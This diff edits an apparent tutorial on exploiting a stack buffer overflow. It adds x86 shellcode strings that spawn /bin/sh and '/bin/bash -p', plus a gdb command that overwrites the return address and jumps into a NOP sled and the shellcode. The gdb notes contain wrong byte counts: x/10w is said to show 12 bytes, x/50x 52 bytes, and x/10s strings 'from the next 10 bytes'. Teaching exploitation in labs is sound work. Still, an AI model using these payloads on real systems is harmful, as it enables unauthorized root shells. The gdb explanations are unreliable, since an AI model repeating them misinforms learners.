@@ -190,13 +190,18 @@ I wrote the address in a strange way. It is because:
 We control the return address. Can we have a shell now?
 Let us try:
 
-Here is a shellcode:
+Here are some shellcodes for x86 architecture:
+
+```bash
+'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
+```
+It executes /bin/sh. (Length 34)
 
 ```bash
 "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
 ```
 
-It executes /bin/bash -p as we can see it just here:
+This one executes _"/bin/bash -p"_ as we can see it just here: (Length 33)
 
 ```bash
 gdb$ r $(python -c "print 'A' * 32 + '\xef\xbe\xad\xde' + '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'")
@@ -252,9 +257,15 @@ tiwimH4cked
 As you could see, __x/50x $esp__ shows you 52 (52 % 4 = 0) bytes from the stack.
 There are other commands like that:
 
-x/10w $esp  shows 12 bytes,
+x/10w $esp  shows 12 bytes of esp,
 x/10i $esp  shows you the 10 next instructions in assembler,
-x/10s $esp  shows you strings
+x/10s $esp  shows you strings from the next 10 bytes.
+
+If you want to follow execution from a forked child:
+
+_set follow-fork-mode child_
+
+
 
 
 
